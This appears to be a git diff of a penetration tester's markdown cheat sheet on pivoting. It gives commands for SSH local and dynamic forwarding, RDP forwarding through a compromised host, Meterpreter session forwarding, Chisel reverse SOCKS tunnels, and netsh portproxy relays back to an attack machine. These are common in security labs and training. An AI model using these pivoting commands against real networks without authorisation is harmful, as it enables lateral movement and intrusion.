@@ -1,30 +1,25 @@
-Port forwarding through SSH can be done in two different ways. Local port forwarding or Dynamic port forwarding.
 
-## Local Port Forwarding
-
-In local port forwarding you are telling your machine to open a specific port and send SSH data through it to the other machine that it is connected to on its specified port.
-    This is helpful when you are trying to access a single service that you know is on the target host
-
-To set this up you will run the following
+## SSH
+### Local Port Forwarding
 
 ```bash
 ssh -L 4444:localhost:8080 target@10.10.10.10
 ```
 
 This will open port 4444 on our localhost and then send traffic through that port to and from port 8080 on the target machine at IP 10.10.10.10
-
-## Dynamic Port Forwarding
-
-In dynamic port forwarding you are opening a port on your local machine and telling it to connect to the target machine over that port with SSH. This will send that traffic to the entire network instead of a specific port on the target. You will then need to use a tool that can route any traffic over the port that you have opened. Something like proxychains.
-    This is helpful when you do not have a target service that you are attacking or if you are trying to scan a subnet that the target might be connected to
-
-To set this up you will run the following
+### Dynamic Port Forwarding
 
 ```bash
 ssh -D 4444 target@10.10.10.10
 ```
 
 This will open port 4444 on our localhost and then send traffic through that port to and from the target host at IP 10.10.10.10
+
+### Forward RDP From an Internal Machine Through a Pivot to You
+
+```bash
+ssh -i rootssh -L 13389:172.16.8.20:3389 root@10.129.229.147
+```
 
 ## Port forward Meterpreter Session Through SSH
 
@@ -44,8 +39,35 @@ set lport 5555
 run -j
 ```
 
-## Forward RDP From an Internal Machine Through a Pivot to You
+## Chisel
 
 ```bash
-ssh -i rootssh -L 13389:172.16.8.20:3389 root@10.129.229.147
+chisel server -p 5555 --reverse
 ```
+
+*Chisel client is run on Windows with the chisel.exe*
+
+```bash
+chisel client <server ip>:5555 R:socks
+```
+
+## Netsh
+
+*Create a listener on Windows machine to listen on port 443 and send traffic back to attack machine*
+
+```PowerShell
+netsh.exe interface portproxy add v4tov4 listenaddress=(my ip) listenport=443 connectaddress=(attack ip) connectport=5985
+```
+
+*Show all current port forwards*
+
+```PowerShell
+netsh.exe interface portproxy show v4tov4
+```
+
+*Delete the port forward listening on port 443*
+
+```PowerShell
+netsh.exe interface portproxy delete v4tov4 listenaddress=(my ip) listenport=443
+```
+
